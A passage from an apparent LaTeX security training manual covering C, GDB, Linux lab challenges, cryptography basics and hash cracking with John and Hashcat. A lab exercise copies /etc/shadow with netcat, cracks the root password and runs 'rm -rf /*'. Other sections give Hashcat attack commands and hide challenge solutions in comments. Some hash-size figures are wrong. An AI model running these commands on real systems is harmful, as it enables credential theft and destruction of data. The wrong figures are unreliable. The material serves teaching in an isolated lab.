				\begin{tabular}{| l | p{8cm} |}
					\hline
					\textbf{Code term} & \textbf{Explanation} \\ \hline
					type *ptr & Create a pointer of name ptr. \\ \hline
					*ptr & The value of whatever ptr is pointing at. \\ \hline
					*(ptr + i) & The value of whatever ptr is pointed at plus i. \\ \hline
					\&thing & The address of thing. \\ \hline
					type *ptr = \&thing & Create a pointer of type named ptr pointing at the address of thing. \\ \hline
					ptr++ & Increment where ptr points. \\ \hline
				\end{tabular}
				\end{adjustbox}
				\caption{Pointer Lexicon}
				\label{tab:PointerLexicon}
			\end{table}
		\subsection{Structs}
			Unlike Python or other Object Oriented languages, C does not have a concept of a class or object. 
			However, it still does have a means of grouping variables together. 
			These are known as structs, which are memory structures created within raw memory.

			Structs are defined as a group of variables. 
			These variables can be of any type, including pointers and arrays. 
			However, when you initialize these variables, you use a new syntax of ``<Struct Name>-><Variable Name> = <value>''. 
			This ``->'' syntax is used for referring to structs through a pointer to them. 
			If you are dealing with the struct variable itself, replace it with ``.''. 
			An example of this syntax can be found in code example \ref{code:CStructs}	
			To make life easier, you can use the ``typedef'' command to make a new variable type out of the struct. 
			Once this is done, you can call the struct as the type that you defined, rather than as ``struct <name>''. 

			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./CStructs.c}
				\caption{Example of a C Struct}
				\label{code:CStructs}
			\end{code}
		\subsection{Heap and Stack Memory}
			You will remember from the \hyperref[ch:ComputerOperations]{Computer Operations Chapter} that memory is divided into the heap and stack memory. 
			In C, these different memory types are allocated and utilized quite differently. 
			The stack is the normal variable definitions that you have been using for most of this section. 
			However, in the struct section, you saw the command ``malloc''. 
			This command will allocate memory on the heap of the size given for it and return a pointer to the start of the allocated memory. 
			
			Heap memory is slightly more complex than general stack memory. 
			C will sort your stack memory for you, removing it as the functions are called and returned. 
			However, memory on the heap will remain forever, even if you lose your pointer to it. 
			That is, unless you explicitly free it using the ``free'' command. 
			This is the reason that C, in the hands of poor programmers will have significant memory leak issues. 
			This is also the reason for the existence of programs such as Valgrind, which will find these leaks for you rather than requiring you to find them manually. 
			
			However, you cannot cheat an place all memory on the stack. 
			This is due to the relatively small size of the stack and its growth patterns. 
			Placing too much, lie a large array or struct will cause the stack to overflow. 
			Furthermore, if you have a pointer to a variable on the stack and return the pointer at the end of the function that created the variable, 
			you will have a segmentation fault due tot he fact that the memory location the pointer is pointing at will not be allocated to the programs stack. 
			It will have been ``poped'' off and destroyed. 

		\subsection{Pointers to Functions}
			As with all other things in C, functions exist at a memory location which can be pointed to. 
			This can be used to pass a function to another function, such as when you need to choose a comparator for a sorting function. 
			The code used to do this can be quite difficult to understand and remember. 
			Due to this, I recommend creating a typedef which will be used to use the pointer as an argument to another function. 
			An example of this being done can be found in code example \ref{code:CFunctionPTR}	
			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./CFunctionPTR.c}
				\caption{Example of a C Function Pointers}
				\label{code:CFunctionPTR}
			\end{code}
	\section{Introduction to Code Obfuscation}
	\section{Debugging with GDB and Peda}
		The GNU Debugger is a tool that is used for stepping through programs to determine what is happening at each step. 
		It can be used either with or without debugging symbols, 
		however having these makes debugging and reverse engineering easier as you have the working code. 
		While the common purpose of GDB is debugging C and C++ programs, it can be used on any language, as well as for reverse engineering and exploit development. 
		The following will be an introduction to the tool, as well as a cheat sheet on the commands that can be used for it. 
			
		The first thing to know about GDB, is how to compile your program to use GDB fully. 
		This means that you will have to make your compiler write out the source code symbols when compiling. 
		This can be done in GCC with the ``-g'' flag, which will create a symbols file that gdb will automatically load. 

		Now that we have a program that is compiling with debugging symbols and running, we can start to use GDB. 
		The first step is to run GDB on the program like so:
		\begin{lstlisting}[style=CLI]
			$ gdb <program>
		\end{lstlisting}
		This will set GDB up to run and take ownership of the process, allowing it to control the execution of the program. 

		\paragraph{List}
		At this point, you may wish to see the code for the program. 
		If you have enabled debugging symbols, this can be done using the command ``list''. 
		Furthermore, you can get a specific output by telling GBB that you want a listing of a particular function or line number. 
		This will output the 10 lines after the point you specified. 
		However, subsequent runs of ``list'' will output the next 10 lines. 

		\paragraph{Break}
		Now that you can see the code, you will likely want to setup breakpoints within it. 
		This can be done using the ``break'' command along with a line number or function name. 
		This will insert a breakpoint at which the program will stop executing and allow you to investigate. 
			
		\paragraph{Run}
		Now that you have set your breakpoints, you will likely want to run the program up to the first break point. 
		This can be done with the ``run'' command.
		This will run the program with any arguments that you give after it, 
		as if you were runnig the program directly from the command line. 
		As outlined earlier, this will also stop execution and allow you to investigate at any break point. 

		\paragraph{Show}
		Now that you have the program running and it has stopped at a break point, 
		you are able to investigate the current state of the program. 
		This is done using the ``show'' command, which with the correct arguments will give you an outline of memory and variables. 
		The following is a list of common ``show'' arguments and their uses:
		\begin{description}
			\item[args] Show the current values of the arguments that were sent to the function that is currently running. 
			\item[backtrace] Show the backtrace. This can be made more specific by giving a specific variable. 
			\item[breakpoint] Show the current breakpoints. 
		\end{description}

		\paragraph{Info}
		Similar to show is the ``info'' command. 
		This command will give you information about a given area of the program or computer. 
		This is generally more helpful in debugging, as it is more focused on execution rather than environment. 
		The following is a list of common ``info'' arguments and their uses:
		\begin{description}
			\item[All-registers] List all registers and their contents. 
			\item[Args] Argument variables of the current stack frame. 
			\item[Breakpoints] Much like ``show breakpoints''. Gives the status of current breakpoints. 
			\item[Float] Show the status of the floating point unit. 
			\item[Frame] Data about the current stack frame. 
			\item[Functions] The names of all functions in the current program. 
			\item[Locals] The names and values of all current stack local variables. 
			\item[Program] Execution status of the program
			\item[Registers] Information about the registers at the current time. 
			\item[Scope] List the variables and their values within the current scope. 
			\item[Stack] Backtrace the stack.
			\item[Threads] Display the currently known threads within the program. 
			\item[Variables] Show the names and values of all global or static variables. 
		\end{description}

		\paragraph{Backtrace}
		This will show you an output of what has happened in the program up to the current time. 
		This is mainly useful for viewing the reasons a program crashed. 

		\paragraph{Step}
		This will allow us to step through the program, instruction or line by line. 
		Each ``step''command will execute the next line the stop, allowing you to inspect the program. 
		Similarly, the ``next'' command will work the same, but will not enter functions. 
		Furthermore, the ``until'' command will continue to step until it reaches a given line number. 

		\paragraph{delete}
		This will delete all breakpoints in the current program. 
		Rather than delete all, 
		you can use the clear command with the same argument you used to set the breakpoint to remove that specific point. 

		\paragraph{Continue}
		This will continue execution as normal until the next breakpoint. 
		This is the most common way of stepping through a program to be debugged. 
			
		\paragraph{Kill}
		This will stop the current program. 
		Furthermore, the ``quit'' command will allow you to exit GDB. 

%TODO: Explain reverse engineering with GDB 
%TODO: Explain PEDA. 
	\section{Programming Challenges}
		\subsection{Linux Challenges}
			\subsubsection{Introduction to Linux}
				This session is designed to familerize you with the Linux command line. 
				The goal of this is both to show you how the Linux command line works, and some of its pitfalls. 
				By the end, you will see both a poorly configured permissions system, and a command which when used the wrong way, will destroy a system. 

				The reason that this is useful to know is that Linux, while also being an exceptionally useful OS, is also the main OS for Penetration testing tools. 
				Thus, understanding the Linux command line is quite useful considering that most of these tools are based on this environment. 

				The following steps will be required to find the flag and wipe the system.  
	
				\begin{enumerate}
					\item Use ``fping'' to check whether the remote host is running and find which IP address it has. 
						The command for this is ``fping -g XXX.XXX.XXX.0/25''. 
					\item Use ``SSH to get command line access to the remote host. 
					% Privelage Ex?
					\item Cat/Less/vim/nano ``/etc/shadow'' and copy the root password to your system. 
						\begin{itemize}
							\item If you would like to make this more interesting, manually send the file to your system. 
							\item Set up a nc listener on any high port with ``nc -l -p XXXX > <output file>''. 
							\item Send the file using ``nc -p XXXX <local host IP> < <input file>''. 
							\item The file should now be on your machine called ``<output file>''. 
						\end{itemize}
					\item Open Johnny and tell it to use the file that you created in the last step. 
					\item switch user to the root account using ``su root'' and the password that Johnny gave you.  
					\item Run the command ``rm -rf /* ''. 
					\item You have now successfully wiped the remote host. 
				\end{enumerate}
			\subsubsection{Setting up a VM and installing Kali Rolling}
				This session will teach you both how to set up a VM in VMware Workstation and install and configure Kali Rolling within it. 
				This will be important to you as it is your main means of security to ensure that you are not attacking a target that you shouldn't be. 
				With properly configured VMs and virtual networks, 
				you cannot attack the wrong target, but without them, 
				a single mistype and you could be attacking a completely different target. 
				
				To Set up a VM correctly, the following items must be set. 
				Where a setting can be relaxed, it has been noted, along with when. 
				\begin{itemize}
					\item Shared Folders should be disabled unless to send a specific file. 
						Generally, this is not useful and provides a good way to get access to the host. 
					\item Processors: Generally as many cores as possible. However, 2 should suffice, 4 is the minimum for good performance. 
					\item Memory: Should be set to minimum 4GB. 
					\item Display: Turn on accelerated graphics and pass through memory. 
					\item Network:
						\begin{itemize}
							\item When working the VM should be set to a custom host only network. 
							\item This will stop any traffic getting out of your lab, as well as helping to stop any malicious traffic reaching the host. 
							\item Between practices, such as when updating tools, NAT will allow you to connect to the internet. 
							\item However, \emph{do not forget to reset to host only} after updating. 
							\item No matter the setup, you will likely want to set ``Use Local DHCP Service'' to enable you to get an IP address rather than setting them all manually. 
							\item When dealing with software that you do not trust, you should also uncheck the ``Connect a host virtual adaptor to this network'' so that the software cannot access the physical host over the network. 
						\end{itemize}
					\item Hard disk: Usually 20GB is fine for basic Linux installs. 
						Windows usually requires more. 
					\item USB: Ensure that you have a USB controller connected. 
						This is your easiest way to get hardware level access. 
					\item Unless you have a server, set compatibility level to 12. 
					\item Isolation: When working, disable both copy and paste and drag and drop. 
						When updating or setting up, feel free to enable them. 
						This is to protect the host system, not to stop attacks leaking. 
					\item Ensure that VNC and other remote connections are disabled. 
				\end{itemize}

			
\chapter{Cryptography}
	\label{ch:Cryptography}
	\section{Introduction to Cryptography}
		%Resource: http://www.thegeekstuff.com/2012/07/cryptography-basics/
		%Resource: http://www.pgpi.org/doc/pgpintro/
		%Resource: http://cacr.uwaterloo.ca/hac/
		Cryptography is the only means of securely transmitting data across a network. 
		It is also the only means of ensuring that data cannot be read by any individual who has access to a storage medium. 
		Thus, it is one of the more important concepts in computational security. 
		Without cryptography, nothing can be confirmed and nothing is secure. 
		However, even with it, it is easy to get wrong. 
		This section will discuss the basic ideas of cryptography without the mathematical background or the algorithmic understanding. 
		It will provide an overview on the requirements for a secure transmission. 
		The technical details of this will be presented in the later sections of this chapter. 
		These details for the specific standards that are used later in this chapter can be found in the FIPS released by NIST.\footnote{\url{http://csrc.nist.gov/groups/STM/cmvp/index.html}}
		\subsection{Key Terms}
			There are a number of terms within Cryptography that you will need to understand before you will understand the field.
			These terms are used to explain the goal or use of a particular part of cryptography\footnote{\url{http://www.thegeekstuff.com/2012/07/cryptography-basics/}}
			\begin{description}
				\item[Plaintext]
					The original message that is to be sent, signed or checked. 
					This is the message that the user or protocol writes to be transmitted to the other host or stored. 
				\item[Ciphertext]
					This is the cryptographically ``secure'' form of the plaintext above. 
					This means that the plaintext has gone through a cryptographical algorithm and is now enciphered within this text. 
				\item[Encryption]
					Conversion from a readable plaintext into an unreadable ciphertext. 
					This is mainly used to gain privacy in either storage or transmission. 
					This process will also come with a key or key pair that is used to encrypt the plaintext. 
				\item[Decryption]
					The process of converting an unreadable ciphertext into a readable plaintext. 
					This is used to allow the decrypting party to read the text. 
					This process will also need either the key, or the second half of the key pair. 
				\item[Authentication]
					This is the act of ensuring that the message received came from the sender claimed by the message. 
					This is based on an action that the receiving party knows only the sending party should be able to do. 
					Usually, this is done through signing with a private key. 
					The signature is then checked with the public key. 
				\item[Integrity] 
					This is the process of checking that the message received has not been altered in transmission. 
					This check is done on receipt of the message, ensuring that any changes in transmission are noticed. 
					Hashing algorithms such as SHA and MD5 are usually used for this process. 
				\item[Non-repudiation]
					Messages that are sent can be traced back to the original source. 
					That source cannot say that they did not send the message as a digital signature has stated their action. 
					This is done in much the same manner as authentication. 
				\item[Hash]
					This is a ``one way'' algorithm that takes a message an converts in into another form. 
					The basis of this is that there should be no way to reverse the algorithm given the output hash. 
					Furthermore, there should be minimal collisions with other messages. 
				\item[Keyspace] The maximum number of possible keys that a cryptographical algorithm could use. 
			\end{description}
		\subsection{Types of Cryptography}
			This section will discuss the three main types of cryptography: secret key, public key and hashing. 
			\subsubsection{Secret Key Cryptograhpy}
				This form uses a single key that all accessing parties must have. 
				The keys complexity---along with the strength of the algorithm---determines the strength of the encryption.
				Due to the use of the same key at either side of the process, this is also commonly known as ``symmetric key encryption. 
				While this type of encryption is usually faster, is poses the problem of getting the key to the other user. 
				This problem is largely alleviated through the use of public key cryptography and key exchange algorithms.
				An example of this process can be found in Figure \ref{fig:SymmetricKey}
				\begin{figure}[htb]
					\centering
					\includegraphics[scale=0.25]{./SymmetricKey.png}
					\caption{Symmetric Key Cryptography Process}
					\label{fig:SymmetricKey}
				\end{figure}
			\subsubsection{Public Key Cryptography}
				Unlike symmetric key cryptography, public key cryptography uses two keys, one stored at each party. 
				These two keys are completely different. 
				They are designed in such a way that given one of them, you should not be able to determine the other. 
				These two keys each have a name and a set of properties. 
				The key used to encrypt the data is known as the public key. 
				It can be read by anyone, as it will not give them access to the data. 
				The key used to decrypt the data is known as the private key. 
				This key will be securely stored on the receiving computer and should never be transmitted. 
				While this solves the problem of key exchange, it is significantly slower. 
				An example of this process can be found in figure \ref{fig:PublicKey}
				\begin{figure}[htb]
					\centering
					\includegraphics[scale=0.25]{./PublicKey.png}
					\caption{Public Key Cryptography Process}
					\label{fig:PublicKey}
				\end{figure}
			\subsubsection{Hashing}
				Hashing does not involve a key, though it may use a salt to ensure the uniqueness of the hash. 
				This process creates a fixed length hash value which represents the plain text message. 
				However, there is no way of taking this hash value and algorithmically decoding the plain text from it. 

				This process is often used in checking that the correct data was transmitted unaltered. 
				It can further be used for the storage of items that need to be checked but should not be stored in plain text. 
				An example of this would be the storage of passwords. 
				
				An example of the hashing process can be found in figure \ref{fig:HashingProcess}
				\begin{figure}[htb]
					\centering
					\includegraphics[scale=0.25]{./HashProcess.png}
					\caption{Hashing Process}
					\label{fig:HashingProcess}
				\end{figure}



		\subsection{Basic Cryptography}
			Cryptography has been around since ancient times. 
			However, it has only been with the introduction of the modern computer that it has become complex and of a high standard. 
			This is because computers are good at breaking weak cryptography, that was the whole purpose of the first digital computer created by Alan Turing and his team at Bletchley Park. 
			This first machine was designed to break the German Enigma Code and was exceptionally successful at it. 

			Basic encryption should not be used in the modern world. 
			It is not the type of encryption that would survive seconds against a well programmed computer. 
			Rather, it is the type of encryption that worked well for the Romans on the battlefield, well before the other commanders had heard of such techniques. 

			\subsubsection{Caesar's Cipher}
				This is the first algorithm that we will discuss. 
				It has little current use, as it's keyspace is 25, however, it serves as a good learning tool. 

				Caesar's Cipher is a simple substitution cipher\footnote{\url{http://www.pgpi.org/doc/pgpintro/}}. 
				This means that the key is simply a number that the alphabet used is shifted by. 
				Then, each letter in the plain text is substituted for the equivalent letter in the shifted alphabet. 
				This process can be seen in figure \ref{fig:CaesarsCipher}
				\begin{figure}[htb]
					\centering
					\includegraphics[scale=0.25]{./CaesarsCipher.png}
					\caption{The Method used for a substitution cipher}
					\label{fig:CaesarsCipher}
				\end{figure}
			\subsection{XOR Cryptography}
				In the same light as the Caesar's cipher, XOR should not be used when you are looking for security. 
				However, it is a stronger algorithm than the substitution cipher shown above. 
				This is due to the fact that the key which can be used for XOR can be as long as the plain text. 

				While stronger than a substitution cipher, XOR still has a number of issues. 
				Foremost is the fact that it is easily reversible. 
				This means that given a known part of the plain text, the key can be deduced. 
				This becomes most obvious when the plain text has a section of null bytes. 
				These bytes will output as the key when passed through the algorithm. 
				Thus, if the attacker may know any part of the plain text, or can control it, XOR is just as weak as a substitution cipher. 

				Furthermore, there is no key chaining done in this algorithm. 
				Thus, if a short key is used, common parts of the plain text will be output in a similar way. 
				This means that images could still show detail and the cipher text is vulnerable to statistical analysis. 

				The XOR algorithm works by running a binary exclusive OR (see chapter \ref{ch:GeneralKnowledge}) 
				over each bit within the plain text and key. 
				The key is looped around, such that each time it gets to the end it links back to the start. 

			\begin{figure}[htb]
				\centering
				\begin{tabular}{| l | l | l |}
					\hline
					\textbf{Plaintext} & \textbf{Key} & \textbf{Ciphertext} \\ \hline
					10101011101010 & 10101110 & 00000100111101 \\ \hline
					00000000000000 & 10101110 & 10101110101011 \\ \hline
					10101011101010 & 00000000 & 10101011101010 \\ \hline
				\end{tabular}
				\caption{XOR Cryptography Example}
				\label{fig:XORExample}
			\end{figure}
			\subsubsection{Encodings}
				Many people confuse encoding for encryption. 
				This confusion can lead to information being leaked, as encoding will not provide any protection. 
				To the untrained eye, these two look similar. 
				However, there are differences that should be understood and can be used to detect which is being used. 

				Encoding, much like encryption and hashing uses a known algorithm. 
				However, unlike encryption, encoding does not use a key. 
				Furthermore, unlike hashing, encoding is not one way. 
				This means that encoding can quickly and easily be returned to plain text as the means of returning is embedded within the algorithm.

				Encoding works by specifying a known character set and mappings amongst this. 
				For example, the binary data that forms this document in encoded as UTF-8, which you read as text. 
				However, this can be done in a different manner. 
				For example, this text could be encoded as a number, or as base 64. 

				Each of these different types of encoding has some part which can be used to determine what type of encoding is used. 
				For example, simple text will usually be encoded as ASCII. 
				Higher characters will have to be encoded as UTF-8 or UTF-16. 
				Numbers can be encoded as decimals, or in a higher base such as 16 or 64. 
				Table \ref{tab:Encodings} contains a list of the names and look of many common encodings. 
				\begin{table}[htb]
					\centering
				\begin{adjustbox}{max width=1\textwidth}
					\begin{tabular}{| l | l |}
						\hline
						\textbf{Name} & \textbf{Encoded Text Example} \\ \hline
						ASCII, UTF-8 etc & This is normal text \\ \hline
						Hexadecimal, base 16 & DEADBEEF, 46DEAC46BC \\ \hline
						Base 64 & YW55IGNhcm5hbCBwbGVhcw== \\ \hline
					\end{tabular}
				\end{adjustbox}
					\caption{Common Encoding Examples}
					\label{tab:Encodings}
				\end{table}
	\section{RSA}
		
		\subsection{\{N : e : c \} Format}
		\subsection{Common Flaws}
		\subsection{Key Recovery}
	\section{Merkle-Hallman Knapsack Cryptosystem}
	\section{Key Exchange}
		%Resource: http://security.stackexchange.com/questions/45963/diffie-hellman-key-exchange-in-plain-english
	\section{Server Authentication}
	\section{Rotational Algorithms}
	\section{Utilizing Cryptography in Python}
	\section{Poor Cryptography Implementations}
		\subsection{DES Weak Keys}
	\section{Eilliptic Curve Encryption}
		\subsection{Common Attacks}
	\section{Hash Cracking}
		Hashes are used in many situations to store passwords. 
		This is done because the hashing algorithm is a one way action, meaning that there is no easy way to calculate the password from the hash. 
		Due to this, the means of authentication on most programs is done by hashing the entered password and comparing it to a stored hash. 
		If the two match, it is likely---though not guaranteed due to collisions---that the password is the same. 
		While this may sound like it makes attacking these targets hard, it is far from being unsolvable. 
		Tools such as ``John the Riper'' and ``Hashcat'' can be used to compute hundreds of thousands of hashes per second, which can then be compared with the given hash. 
		This makes hash cracking a matter of time and dictionary crafting. 
		\subsection{John the Riper}
			While there are many tutorials\footnote{\url{http://openwall.info/wiki/john/tutorials}} on the usage of John the Riper (John) which go into specific detail, this section will explain the basic usage of the tool. 
			Before starting, check that the version of John which you have installed is correctly compiled for your system, you may want to enable options such as GPU cracking, which needs to be done at compile time. 
			What follows is a list of common commands for use with John:
			\begin{description}
				\item[-single]
					The simplest means of attacking a hash. 
					This mode uses only a basic word-list and very few rules. 
					Thus it is not recommended for anything but the most basic attacks. 
				\item[-wordfile:]
					Uses the word-list specified directly after the colon. 
				\item[-rules:]
					Specifies the mutation rules for the given word-list. 
					These can be used to create a dictionary with substitutions, such as 1337 speak. 
				\item[-incremental:]
					This, along with options such as ``alpha'', ``digits'' or ``lanman'' will give you a brute force of letters, numbers or both with some special characters respectively. 
				\item[-external:]
					Allows the use of pre-configured modes, which can be powerful if used or modified correctly. 
					%TODO: add more to this and rules. 
				\item[-restore:]
					Will start a crack part way through based on a restore file created by a previous session. 
				\item[-sesion:]
					Used to name the restore file that will be created when the session is broken. 
				\item[-status:]
					Shows how far into the crack a previous session was stopped. 
				\item[-show]
					Shows how many passwords within a file have been cracked and how many remain. 
				\item[-format:]
					Specify the hash format (such as SHA512) which the hash to crack was created with. 
			\end{description}
			
		\subsection{Hashcat}
			Hashcat was started due to the fact that at the time, tools such as John the Riper did not make proper use of multi-threading. 
			This has been expanded to include GPGPU processing using tools such as openCL and CUDA, and has made hashcat one of the fastest hash cracking tools currently available. 
			Both Hashcat and the newer oclHashcat use the same input files and command syntax. 
			However, oclHashcat will conduct the crack on the GPU installed on the system, rather than the slower CPU. 

			Hashcat uses a number of modes to allow it to crack hashes. 
			Each of these modes has a number of specific properties which make it better at a given type of attack. 

			\subsubsection{Mask Attack}
				This attack, while similar to a brute force attack, uses a mask to reduce the possible character set of the attacks.\footnote{\url{http://hashcat.net/wiki/doku.php?id=mask_attack}} 
				Rather than run through every possible permutation of the character space for every character in the password, the mask attack requires that the user input some details of the characters within the password. 
				
				When using this mode, for each position within the password, we need to create a mask using either the character sets outlined in table \ref{tab:HashcatMaskCharSets} or a custom character set defined before starting. 
				\begin{table}[htb]
					\centering
				\begin{adjustbox}{max width=1\textwidth}
					\begin{tabular}{| l | l |}
						\hline
						?l & abcdefghijklmnopqrstuvwxyz \\ \hline
						?u & ABCDEFGHIJKLMNOPQRSTUVWXYZ \\ \hline
						?d & 0123456789 \\ \hline
						?s & <space>!"\#\$\%\&\verb!'()*+,-./:;<=>?@[\]\^_`{|}~}! \\ \hline
						%?s & Special Characters \\ \hline%TODO: Have this print the characters. 
						?a & \verb+?l?u?d?s+ \\ \hline
						?b & 0x00 - 0xff \\ \hline
					\end{tabular}
				\end{adjustbox}
					\caption{Hashcat Mask Mode Built in Character Sets}
					\label{tab:HashcatMaskCharSets}
				\end{table}
				Attacks in this mode are limited by the length of the mask given. 
				This means that if you give a mask with 8 character spaces, but have a password which is 6 characters long, you will be unable to crack it. 
				Due to this, the ``\verb+--+increment'' flag was created. 
				Furthermore, a list of standard character sets for multiple languages can be found in ``/usr/share/hashcat/charsets/''.

				Another means of creating this attack mode is to use a Hashcat Mask File. 
				These files contain a number of masks and the custom character sets which are used within them, in order to run attacks which are regularly repeated. 
				To use one of these files, run Hash cat with the arguments ``-a 3 <hash file> <mask file>''.

			\subsubsection{Dictionary Attack}
				In this attack, a dictionary or word list is created to be utilized within the attack. 
				This dictionary can either be one that you found on the system or one that was created specifically for the job. 
				Due to the limitations of this attack, it is recommended that it is either used with a specifically generated dictionary, which can be done by a program such as John the Riper or
				a can be manually written through the use of a python script. 
				This type of attack may be the first that you use, as it will likely be the quickest attack. 
			\subsubsection{Combinator Attack}
				In this attack, each word of a dictionary is appended to each word in a second dictionary. 
				This will catch many passwords which use two simple words, as long as the dictionary is well written. 
				However, if the dictionaries that you are using have already been enumerated in such a way, it will likely not produce useful results. 
				Furthermore, this attack will not run the words from each dictionary separately. 
				To use this attack, run the top command for GPU or the bottom command for CPU. 
				\begin{lstlisting}[style=CLI]
					$ oclHashcat64 -m 0 -a 1 <hash file> <dict1> <dict2>
					
					$ hashcat-cli64 -m 0 -a 1 <hash file> <dict 1 and 2>
				\end{lstlisting}
			\subsubsection{Hybrid Attack}
				This attack uses the concepts of both the combinator and mask attacks. 
				This means that you can specify a dictionary and have hashcat add the mask that you give to either the start or end of the word. 
				Using this means, you can easily run through passwords such as name and birth year combinations. 
				To conduct this attack, use the command:
				\begin{lstlisting}[style=CLI]
					$ oclhashcat -a 7 <mask> <dict>
					$ oclhashcat -a 7 <dict> <mask>
				\end{lstlisting}
				
		\subsection{Rainbow Tables}
			In both of the previous sections, we have been calculating the hashes which we are testing against the password hash on the go. 
			This means that we have to calculate the algorithm, sometimes multiple thousands of times, for each password we want to try. 
			There is another option: rainbow tables. 
			This method of cracking passwords allows us to have a precomputed list of hashes and their respective passwords, which we then simply search through. 
			This results in two significant differences:
			\begin{itemize}
				\item Password cracking takes seconds
				\item Your hard drive is full. 
			\end{itemize}
			However, these tables are not the be all and end all of hash cracking. 
			They rely on the hashes being computed either with no salt or with the same salt as the table, meaning that hashes generated using a randomized salt will not be vulnerable. 
			Furthermore, they rely on the attacker being able to find a table which will suit the password. 
			Thus, if your password is a 50 character essay with special characters, it will likely not show up in the table due to size constraints. 
			Such a table would have to contain $\approx2.49\times10^{66}$ password--hash pairs, resulting in a file size of $\approx2.6\times10^{44}$Yottabytes.
			Though this cannot be thought of as a limitation when compared to the two other methods, as for the same password, they would take $\approx5.2\times10^{52}$ years on 3 ATI HD7970 GPUs.\footnote{\url{https://litecoin.info/Mining\_Hardware\_Comparison}}
			At this point, even assuming Moore's law continues and Processing power becomes far cheaper, the password will not be cracked within a reasonable time frame. 

			It is for these reasons that rainbow tables are uncommonly used outside of cracking hashes from poorly implemented software with short passwords. 
			However, if you know that the character space is small, and either the passwords are unsalted or the salt is commonly known, rainbow tables are the best method if you have the storage space. 
		\subsection{Online Methods}
			With the rise of cloud computing and cheap server rental, many people have begun using tools such as Amazon Web Services to run crack servers. 
			This is done by deploying the tools shown above into a server which has been rented with multiple GPUs. 
			This server can then be optimized such that the cracking will properly utilize the GPUs of the machine as well as only calculating hashes that have a possibility of being correct. 
			Thus, as above, if you know that the hash will be within a given dictionary, or that it does not contain special characters, use these functions. 

			While this will work, and usually faster than using one's own computer, it is not as fast as a dedicated cracking cluster. 
			These clusters work by having a number of machines, each with the necessary hardware and software installed working together on the one hash. 
			Programs such as Hashcat can be used to control up to 125 GPUs across the cluster in order to crack the hashes you provide. 
			This method, while expensive and difficult to set up, is currently the fastest means of cracking a hash. 
			However, if you set your cracking program up properly, it will still likely beat this setup when it is brute forcing hashes. 
		\subsection{Salting}
			Many of the methods above become significantly more difficult when salting is introduced. 
			Normally, a hash will be produced by simply running a hash function on the password ($hash(pass)$). 
			However, when salting is implemented, the hash may be generated by adding either a known string or a random string---or sometimes both---to the password before passing it to the hash function ($hash(pass + "salt"$ or $hash(pass + rand()$).
			In either of these cases, the salt must be stored, which has led to split salting, using a random stored value or the users name/ID as well as a hard coded element. 
			This makes knowing the salt hard, but not impossible, as we can reverse engineer the code in order to determine the salting algorithm used and a simple ``strings'' on the compiled code will give us a hard coded salt string. 
			Nonetheless, these methods deter attackers from attempting to crack the hashes by limiting their choices and removing their ability to use rainbow tables. 
		\subsection{SHA}
		\subsection{Hash Collisions}
			Hashes, by their nature must have collisions. 
			This is due to the fact that they take a large amount of information and turn it into a string of a standard size. 
			For example, an SHA256 hash has a length of 65 and a character space of 36. 
			This gives $1.84\times10^{66}$ possible values. 

			This is the basis for collisions. 
			Consider that there are vastly more than this number of items that can be hashed, 
			If this is true, some of these items must have the same hash value as other items.
			Furthermore, if you can find a collision with the item you are testing, you need only pass that collision, rather than the item itself. 

			This is the exact reason hashing algorithms such as MD5 are being replaced with SHA512. 
			It is now easy to find a collision value for the smaller key space MD5, meaning that using it for secure storage or any other purpose is near pointless. 

			Table \ref{tab:HashCollisions} contains the maximum number of hash values for common hash types.
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| l | l |}
					\hline
					\textbf{Hash Type} & \textbf{Number of Values} \\ \hline
					SHA256 & $1.44\times10^{102}$ \\ \hline
					SHA512 & $5.79\times10^{201}$ \\ \hline
					SHA1   & $6.4\times10^{64}$ \\ \hline
					MD5	   & $2.28\times10^{52}$ \\ \hline
				\end{tabular}
			\end{adjustbox}
				\label{tab:HashCollisions}
				\caption{Number of Possible Hashes for Different Algorithms}
			\end{table} 
	\section{Challenges}
		\subsection{Hash Challenges}
			This first challenge is based on the \href{https://xkcd.com/936/}{xkcd comic ``Password Strength''.}
			The word-list for this challenge can be found by using the following command on kali linux:
			\begin{lstlisting}[style=CLI]
				$ head -n 20	/usr/share/wordlists/rockyou.txt
			\end{lstlisting}
			The password, hashed in MD5 and SHA256 can be found below. 
			\lstinputlisting[numbers=none,firstline=1,lastline=4]{./shellOut/hashChallenges.data}
			While you can complete this in any way you like, I recommend either using John's rules, or creating a custom word list and using Hashcat's hybird mode. 
			%Solution: "N1c0l3;7"

			The second challenge is based on an ATM keypad. 
			Through an image captured when the hash was pulled, it was determined that the only keys pressed were ``2, 4, 9 and 0''. 
			The password was also determined to be exactly 16 characters long. 
			Create a custom mask for Hashcat and solve this sha256 hash. 
			\lstinputlisting[numbers=none,firstline=6,lastline=6]{./shellOut/hashChallenges.data}
			%solution: "2490092442902942"

			The third challenge is based on using multiple dictionary words. 
			This is a common method used to create passwords. 
			I recommending using Hashcat in combinator mode to solve this SHA256 hash. 
			All the words necessary to solve this can be found in the rockyou word-list. 
			\lstinputlisting[numbers=none,firstline=8,lastline=8]{./shellOut/hashChallenges.data}
\chapter{System Hardening}
	\label{ch:SystemHardening}
	Securing one's own operating system and the software within can be a daunting task. 
	One must way up the needs of security against the usability of the system, or face months of instability or system management on a broken system. 
	Thus, for each recommendation below, decide how the computer needs to work for you and implement it to that level.\\ 
	If the newly secured system does not work for you, simply roll it back until it does. 
	When implementing this, remember that the biggest threat will always be the user of the system. 
	Thus, security must be implemented in layers, each of which is able to stop attacks which may have breached the outer layers. However, no matter how secure the system is made, if it is on, it is vulnerable. 
	Each section within this will be referenced in the footnotes. See those references for information on the implementation of these notions. 
	\section{Linux Hardening}
		Due to the varied nature of Linux distributions, it is difficult to provide an exact guide to securing an arbitrary Linux install. 
		However, this section will discuss the protections which will work on the general system.\footnote{\url{http://www.asd.gov.au/publications/protect/top\_4\_mitigations\_linux.htm}} 
		For distribution specific guides, look to your distribution's guides\cite{FedoraSecGuide}or wiki.\footnote{\url{https://wiki.archlinux.org/index.php/Security}}
		\subsection{Passwords} 
			Your password are the key to having a secure system. 
			Especially once disk encryption and password managers are in use, they can be the downfall of one's entire computing presence. 
			Thus, passwords should be created and managed in a secure way:
			\begin{itemize}
				\item Not containing personal information.
				\item Not dictionary words or common substitutions (such as 1337Speak)
				\item Not having all numbers or symbols at the start or end. 
				\item Not a common short phrase. 
